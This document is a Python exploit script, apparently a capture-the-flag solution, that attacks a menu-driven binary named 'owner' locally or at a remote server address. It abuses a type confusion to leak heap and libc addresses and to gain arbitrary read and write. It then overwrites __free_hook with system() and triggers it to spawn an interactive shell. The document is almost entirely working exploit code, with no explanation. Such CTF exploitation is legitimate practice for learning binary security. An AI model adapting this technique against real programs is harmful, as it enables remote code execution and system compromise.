import pwnbox,struct
SERVER=False
def unpack(x,f="<Q"):
  return struct.unpack(f,x)[0]

def pack(x,f="<Q"):
  return struct.pack(f,x)

def apart(name,floor,house,des,ex=False):
  p.read_until(">")
  p.write("1\n")
  for x in [name,floor,house]:
    p.read_until("?")
    p.write(str(x)+"\n")
    if ex and x==name:
      p.interact()

  p.read_until(":")
  p.write(str(des)+"\n")

def change(ty,idx,to_ty):
  for x in [4,2,ty,idx,to_ty,4,3]:
    p.read_until(">")
    p.write(str(x)+"\n")

def leak_adr():
  for x in [4,1,3,1]:
    p.read_until(">")
    p.write(str(x)+"\n")
  p.read_until("Normal price of menu :")
  ret = int(p.read_until("\n"))
  for x in [9,4,3]:
    p.read_until(">")
    p.write(str(x)+"\n")
  return ret

def get(adr,is_leak=True):
  for x in [4,1,3,1,6,adr,9,1]:
    if x!=adr:
      p.read_until(">")
    else:
      p.read_until(":")
    p.write(str(x)+"\n")
  p.read_until("2. ")
  ret = ""
  if is_leak:
    ret = p.read_until("\n")[:-1]
  for x in [-1,-1,-1]:
    p.read_until(">")
    p.write(str(x)+"\n")

  return ret

def write(adr,v):
  get(adr,False)
  for x in [4,1,1,2,1,v]:
    if x!=v:
      p.read_until(">")
    else:
      p.read_until(":")
    p.write(str(x)+"\n")
  for x in [6,6,6,]:
    p.read_until(">")
    p.write(str(x)+"\n")

def read(adr):
  ret = 0
  for i in range(8):
    ret += (unpack(get(adr+i )[:8].ljust(8,"\x00"))) << (i*8)
  return ret
 
if SERVER:
  p = pwnbox.pipe.SocketPipe("200.200.200.103", 51015)
else:
  p = pwnbox.pipe.ProcessPipe("./owner")
apart(("sh;"*0x1000)[:0x1000],0x22,0x22,"B")
apart("A",0x22,0x22,"B")
apart("D",0x33,0x33,"E")
change(1,2,2)


heap = leak_adr()-0x12d50

if SERVER:
  libc = read(heap+0x12da0)-0x3c3b78
else:
  libc = read(heap+0x12da0)-0x3c1b58
if SERVER:
  system = libc+0x0000000000045390
  free_hook = libc +0x00000000003c57a8
else:
  system = libc+0x0000000000456d0
  free_hook = libc +0x00000000003c3788
write(free_hook,pack(system).rstrip("\x00"))
p.read_until(">")
p.write("5\n")
p.interact()
